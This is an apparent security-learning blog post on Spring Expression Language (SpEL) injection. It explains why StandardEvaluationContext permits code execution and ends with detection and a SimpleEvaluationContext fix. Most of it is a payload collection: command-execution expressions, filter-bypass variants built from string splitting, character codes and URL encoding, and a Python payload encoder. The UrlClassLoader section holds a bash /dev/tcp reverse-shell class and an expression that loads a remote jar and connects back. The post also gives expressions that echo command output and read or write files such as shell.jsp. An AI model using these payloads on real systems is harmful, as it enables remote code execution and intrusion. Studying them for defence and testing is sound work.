# Java Security Learning—SpEL Expression Injection

Author: H3rmesk1t

Data: 2022.03.18

# SpEL Introduction
`Spring` Expression Language (SpEl` for short) is a powerful expression language that supports querying and manipulating runtime object navigation graph functions. Its syntax is similar to traditional `EL`, but provides additional functionality, and the best of which are function calls and template functions for simple strings.

Although there are other optional Java expression languages, such as OGNL, `MVEL`, `JBoss EL`, etc., the original intention of Spel` was created was to provide the Spring community with a simple and efficient expression language, a language that can run through the entire Spring product group. The characteristics of this language should be designed based on the needs of the Spring product. Although the `SpEL` engine is the basis for expression parsing in the Spring` combination, it does not directly rely on `Spring` and can be used independently.

`SpEL` Features:
 - Use the `Bean`'s `ID` to reference `Bean`;
 - Callable methods and accessed objects properties;
 - Can perform arithmetic, relational and logical operations on values;
 - Regular expressions can be used to match;
 - Can perform collection operations.

The `SpEL` expression language supports the following functions:
 - Text expression.
 - Boolean and relational operators.
 - Regular expressions.
 - Class expression.
 - Visit `properties`, `arrays`, `lists`, `maps`.
 - Method call.
 - Relational operator.
 - Parameters.
 - Call the constructor.
 - `Bean` quote.
 - Construct `Array`.
 - Inline `lists`.
 - Inline `maps`.
 - Tripartite operator.
 - Variable.
 - User-defined function.
 - Collection projection.
 - Collection filtering.
 - Template expression.

# SpEL Use
There are three forms of usage of `SpEL`, one is in the annotation `@Value`, one is the `XML` configuration, and the last is to use `Expression` in the code block.

## Annotation @Value Usage
`@Value` can modify member variables and method parameters. In `#{}`, the syntax of the `SpEL` expression, and `Spring` will assign values ​​to variables according to the `SpEL` expression syntax.

```java
public class User {
    @Value("${ spring.user.name }")
    private String Username;
    @Value("#{ systemProperties['user.region'] }")
    private String defaultLocale;
    //...
}
```

## XML configuration usage
In the `SpEL` expression, the scope and methods of the class are called using the `T(Type)` operator. The `T(Type)` operator returns an `object`, which can help obtain the static method of a certain class, and the usage is `T (fully qualified class name). Method name()`, that is, the class can be operated through the type expression of this class, for example:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
    http://www.springframework.org/schema/beans/spring-beans-3.0.xsd ">

    <bean id="helloWorld" class="com.mi1k7ea.HelloWorld">
        <property name="message" value="#{T(java.lang.Runtime).getRuntime().exec('calc')}" />
    </bean>
</beans>
```

## Expression Usage
Various `Spring CVE` vulnerabilities are basically based on `SpEL` expression injection in the form of `Expression`.

`SpEL` is generally divided into four steps when locating expression values:
 1. Create a parser: `SpEL` uses the `ExpressionParser` interface to represent the parser, and provides the default implementation of `SpelExpressionParser`;
 2. Parsing expressions: Use the `parseExpression` of `ExpressionParser` to parse the corresponding expression as the `Expression` object;
 3. Construct context: Prepare the context data required for expressions such as variable definitions (can be saved);
 4. Evaluation: Obtain expression values ​​based on context through the `getValue` method of the `Expression` interface.

Main interface:
 - ExpressionParser interface: represents a parser. The default implementation is the SpelExpressionParser class in the `org.springframework.expression.spel.standard` package. Use the `parseExpression` method to convert a string expression to an `Expression` object. For the `ParserContext` interface, it is used to define whether a string expression is a template, as well as the template start and end characters;
 - `EvaluationContext` interface: represents the context environment. The default implementation is the `StandardEvaluationContext` class in the `org.springframework.expression.spel.support` package, use the `setRootObject` method to set the root object, use the `setVariable` method to register custom variables, use the `registerFunction` to register custom functions, etc.
 - `Expression` interface: represents an expression object. The default implementation is `SpelExpression` in the `org.springframework.expression.spel.standard` package. The `getValue` method is provided to get expression values, and the `setValue` method is provided to set object values.

The example code is as follows. The difference between the usage of the previous XML configuration is that the program will parse the string parameters of the `parseExpression` function passed here as a `SpEL` expression, without specifying it through the `#{}` symbol:

```java
// Operate class calculator, the class under java.lang package can omit the package name.
String spel = "T(java.lang.Runtime).getRuntime().exec(\"open -a Calculator\")";

// String spel = "T(java.lang.Runtime).getRuntime().exec(\"calc\")";
ExpressionParser parser = new SpelExpressionParser();
Expression expression = parser.parseExpression(spel);
System.out.println(expression.getValue());
```

In this usage, class instantiation also uses the `Java` keyword `new`, and the class name must be a fully qualified name (except for the types in the `java.lang` package).

# SpEL expression injection vulnerability
## Vulnerability Principle
`SimpleEvaluationContext` and `StandardEvaluationContext` are two `EvaluationContext` provided by `SpEL`:
 - `SimpleEvaluationContext`: Exposes a subset of `SpEL` language features and configuration options for expression categories that do not require the full scope of `SpEL` language syntax and should be intentionally restricted.
 - `StandardEvaluationContext`: Exposes a full set of `SpEL` language features and configuration options, which can be used to specify the default root object and configure each available evaluation-related policy.

`SimpleEvaluationContext` is intended to support only a subset of the `SpEL` language syntax, excluding `Java` type reference, constructor, and `bean` reference; while `StandardEvaluationContext` supports all `SpEL` syntax.

As we know earlier, the `SpEL` expression can operate classes and methods, and any class method can be called through the class type expression `T(Type)`. This is because the default is `StandardEvaluationContext` without specifying `EvaluationContext`, which contains all the functions of `SpEL`, which can successfully cause arbitrary command execution when allowing users to control input.

<div align=center><img src="./images/1.png"></div>

## Process Analysis
Point the breakpoint at `getValue`, follow up `SpelExpression#getValue`, and call the `this.getEvaluationContext` method when creating the instance `ExpressionState`.

<div align=center><img src="./images/2.png"></div>

Since `evaluationContext` is not specified, the `StandardEvaluationContext` instance will be obtained by default. As mentioned above, it contains
All functions of `SpEL`, which is why the command can be executed.

<div align=center><img src="./images/3.png"></div>

Then get the class and call the corresponding method to execute the command.

## PoC
### ProcessBuilder

```java
new java.lang.ProcessBuilder(new String[]{"open", "-a", "Calculator"}).start()
```

```java
new ProcessBuilder(new String[]{"open", "-a", "Calculator"}).start()
```

### RunTime
Note: Since the `RunTime` class uses singleton mode, the acquisition object cannot be obtained directly through the constructor method, and must be obtained through the static method `getRuntime`. If you call the static method, you need to use the `SpEL`` T()` operator. The `T()` operator will return an `object`.

```java
T(java.lang.Runtime).getRuntime().exec("open -a Calculator")
```

```java
T(Runtime).getRuntime().exec(new String[]{"open", "-a", "Calculator"})
```

### ScriptEngine
Since the `eval` function in `JS` can parse strings as code, and the `ScriptEngineManager` class comes with `JDK6`, which supports `Java` objects that call `Java` in `JS`. Therefore, `Java` can be used to call `eval` of the `JS` engine, and then in turn call `Java` objects in `Payload`.

Get all `JavaScript` engine information:

```java
public static void main(String[] args) {
    ScriptEngineManager manager = new ScriptEngineManager();
    List<ScriptEngineFactory> factories = manager.getEngineFactory();
    for (ScriptEngineFactory factory: factories){
            System.out.printf(
                "Name: %s%n" + "Version: %s%n" + "Language name: %s%n" +
                "Language version: %s%n" +
                "Extensions: %s%n" +
                "Mime types: %s%n" +
                "Names: %s%n",
                factory.getEngineName(),
                factory.getEngineVersion(),
                factory.getLanguageName(),
                factory.getLanguageVersion(),
                factory.getExtensions(),
                factory.getMimeTypes(),
                factory.getNames()
            );
    }
}
```
Through the output result, we can know that the parameters of `getEngineByName` can be filled in `nashorn`, `Nashorn`, `js`, `JS`, `JavaScript`, `javascript`, `ECMAScript`, `ecmascript`.

```java
// Nashorn can be replaced with other engine names
new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("s=[3];s[0]='open';s[1]='-a';s[2]='Calculator';java.lang.Runtime.getRuntime().exec(s);")
```

### UrlClassLoader
`JVM` has multiple `ClassLoaders`, and different `ClassLoaders` will load bytecode files from different places. The loading method can be loaded through different file directories, or from different `jar` files, and also includes loading using network service addresses. Several common important `ClassLoader`: `BootstrapClassLoader`, `ExtensionClassLoader`, and `AppClassLoader`, and `UrlClassLoader`.

Utilization idea: Remotely load the `class` file, and call it through function calls or static code blocks. First construct a `Exploit.class` and put it in the remote `vps`

For example, bounce the `exp.java` of `shell` by constructing:

```java
public class exp {
    public exp(String address) {
        address = address.replace(":","/");
        ProcessBuilder p = new ProcessBuilder("/bin/bash","-c","exec 5<>/dev/tcp/"+address+";cat <&5 | while read line; do $line 2>&5 >&5; done");
        try {
            p.start();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```

```java
new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL("http://127.0.0.1:9999/exp.jar")}).loadClass("exp").getConstructors()[0].newInstance("127.0.0.1:2333")
```

### AppClassLoader
`AppClassLoader` is directly targeted to the user. It will load the `jar` package and directory in the path defined in the `Classpath` environment variable. Due to the existence of parent delegation, it can be loaded to the class we want. The prerequisite for use is to get. Get the `AppClassLoader` can be obtained through the static method of the `ClassLoader` class.

```java
T(ClassLoader).getSystemClassLoader().loadClass("java.lang.Runtime").getRuntime().exec("open -a Calculator")
```

```java
T(ClassLoader).getSystemClassLoader().loadClass("java.lang.ProcessBuilder").getConstructors()[1].newInstance(new String[]{"open", "-a", "Calculator"}).start()
```

### Get AppClassLoader through other classes
In actual projects, developers often import many dependencies `jar` or write custom classes.

For example, here we use the class `org.springframework.expression.Expression` to get the `AppClassLoader`.

```java
T(org.springframework.expression.spel.standard.SpelExpressionParser).getClassLoader().loadClass("java.lang.Runtime").getRuntime().exec("open -a Calculator")
```

<div align=center><img src="./images/4.png"></div>

For example, here we use the custom class `h3rmek1t.javawebsecurity.ElShell` to get the `AppClassLoader`.

```java
T(h3rmek1t.javawebsecurity.ElShell).getClassLoader().loadClass("java.lang.Runtime").getRuntime().exec("open -a Calculator")
```

<div align=center><img src="./images/5.png"></div>

### Loading UrlClassLoader via built-in objects
Reference [Spring SPEL Injection Vulnerability Exploit](https://mp.weixin.qq.com/s?__biz=MzAwMzI0MTMwOQ==
&idx=1&mid=2650174018&sn=94cd324370afc2024346f7c508ff77dd). The `request` and `response` objects are frequent visitors to the `web` project. If the `spel` dependency is introduced in the `web` project, then these two objects will be automatically registered.

```java
{request.getClass().getClassLoader().loadClass(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).exec(\"touch/tmp/foobar\")}
```

```java
username[#this.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec('open -a Calculator')")]=asdf
```

## ByPass
### Reflection call

```java
T(String).getClass().forName("java.lang.Runtime").getRuntime().exec("open -a Calculator")
```

```java
#this.getClass().forName("java.lang.Runtime").getRuntime().exec("open -a Calculator")
```

### Reflection call && String stitching

```java
T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]{"open","-a","Calculator"})
```

```java
#this.getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]{"open","-a","Calculator"})
```

### Dynamically generate characters
When the executed system commands are filtered or encoded by the `URL`, characters can be generated dynamically through the `String` class.

 - Part1
```java
T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(111).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(110 )).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character) .toString(67)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(117)).concat(T(java.l ang.Character).toString(108)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(114)))
```

 - Part2
```java
new java.lang.ProcessBuilder(new String[]{new java.lang.String(new byte[]{111,112,101,110}),new java.lang.String(new byte[]{45,97}),new java.lang.String(new byte[]{67,97,108,99,117,108,97,116,111,114})}).start()
```

Character `ASCII` code conversion generation for dynamically generating characters in the `String` class:

```python
def shell():
    shell = input('Enter shell to encode: ')

    part1_shell = 'T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)' % ord(shell[0])
    for c in shell[1:]:
        part1_shell += '.concat(T(java.lang.Character).toString(%s))' % ord(c)
    part1_shell += ')'
    print('\nPart1: ')
    print(part1_shell + '\n')

    part2_shell = 'new java.lang.ProcessBuilder(new String[]{'
    args = shell.split(' ')
    len_args = len(args)
    len_temp = 0
    while(len_temp < len_args):
        temp = 'new java.lang.String(new byte[]{'
        for i in range(len(args[len_temp])):
            temp += str(ord(args[len_temp][i]))
            if (i != len(args[len_temp]) - 1):
                temp += ','
        temp += '})'
        part2_shell += temp
        len_temp += 1
        if len_temp != len_args:
            part2_shell += ','

    part2_shell += '}).start()'
    print('\nPart2: ')
    print(part2_shell + '\n')

if __name__ == '__main__':
    shell()
```

### JavaScript Engine

```java
T(javax.script.ScriptEngineManager).newInstance().getEngineByName("nashorn").eval("s=[3];s[0]='open';s[1]='-a';s[2]='Calculator';java.la"+"ng.Run"+"time.getRu"+"ntime().ex"+"ec(s);")
```

```java
T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(\"JavaScript\").eval(\"s=[3];s[0]='open';s[1]='-a';s[2]='Calculator';java.la\"+\"ng.Run\"+\"time.getRu\"+\"ntime().ex\"+\"ec(s);\"))
```

### JavaScript Engine && Reflection Calls

``
`java
T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName("JavaScript").eval(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").ge tMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]{"open","-a","Calculator"})))
```

### JavaScript Engine && URL Coding

```java
T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(\"JavaScript\").eval(T(java.net.URLDecoder).decode(\"%6a%61%76%61%2e%6c%61%6e%67%2e% 52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%6f%70%65%6e%20%2d%61%20%43%61%6c%63%75%6c%61%74%6f%72%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29\")))
```

### JShell
New `shell` added in `JDK9`.

```java
T(SomeWhitelistedClassNotPartOfJDK).ClassLoader.loadClass("jdk.jshell.JShell",true).Methods[6].invoke(null,{}).eval('open -a Calculator').toString()
```

### Bypass T(Filter
When `SpEL` encodes characters, `%00` will be replaced directly with empty.

```java
T%00(new)
```

### Bypass getClass(

```java
// The 15 here may need to be replaced with 14, and the serial numbers of different jdk versions are different.
"".class.getSuperclass().class.forName("java.lang.Runtime").getDeclaredMethods()[15].invoke("".class.getSuperclass().class.forName("java.lang.Runtime").getDeclaredMethods()[7].invoke(null),"open -a Calculator")
```


## Echo
The above article describes how to execute system commands through `SpEL`, and then let’s see how to obtain echoes of command execution in a line of `SpEL` statement.

### commons-io
Use the `commons-io` component to achieve echo. This method will be limited by whether the target server has this component. This component is not used in the default environment of `springboot`.

```java
T(org.apache.commons.io.IOUtils).toString(payload).getInputStream())
```

### JShell
The above `JShell` can implement echo output, but this method will be limited by the version problem of `jdk`.

```java
T(SomeWhitelistedClassNotPartOfJDK).ClassLoader.loadClass("jdk.jshell.JShell",true).Methods[6].invoke(null,{}).eval('whatever java code in one statement').toString()
```

### BufferedReader
The `jdk` native class implements the output of echoing, but this method can only read one line.

```java
new java.io.BufferedReader(new java.io.InputStreamReader(new ProcessBuilder("whoami").start().getInputStream(), "gbk")).readLine()
```

### Scanner
Use the `Scanner#useDelimiter` method to split the output using the specified string, so you can give a messy string here, and all characters will be on the first line, and then execute the `next` method to get all the output.

```java
new java.util.Scanner(new java.lang.ProcessBuilder("ls", "/").start().getInputStream(), "GBK").useDelimiter("h3rmesk1t").next()
```

## Read and write files
 - Read the file

```java
new String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get(T(java.net.URI).create("file:/C:/Users/helloworld/shell.jsp"))))))
```

 - Write a file

```java
T(java.nio.file.Files).write(T(java.nio.file.Paths).get(T(java.net.URI).create("file:/C:/Users/helloworld/shell.jsp")), '123464987984949'.getBytes(), T(java.nio.file.StandardOpenOption).WRITE)
```

# Detection and Defense
## Detection method
Global search key features:

```java
// Key categories
org.springframework.expression.Expression
org.springframework.expression.ExpressionParser
org.springframework.expression.spel.standard.SpelExpressionParser

// Call feature
ExpressionParser parser = new SpelExpressionParser();
Expression expression = parser.parseExpression(str);
expression.getValue()
expression.setValue()
```

## Defense Method
The most direct fix is ​​to replace the StandardEvaluationContext using `SimpleEvaluationContext`.

```java
String spel = "T(java.lang.Runtime).getRuntime().exec(\"calc\")";
ExpressionParser parser = new SpelExpressionParser();
Student student = new Student();
EvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().withRootObject(student).build();
Expression expression = parser.parseExpression(spel);
System.out.println(expression.getValue(context));
```


# refer to
 - [SpEL injection RCE analysis and bypass](https://xz.aliyun.com/t/9245#toc-5)

 - [Summary of SpEL Expression Injection Vulnerability](https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/)

 - [Spring Expression Language (SpEL)](http://itmyhome.com/spring/expressions.html)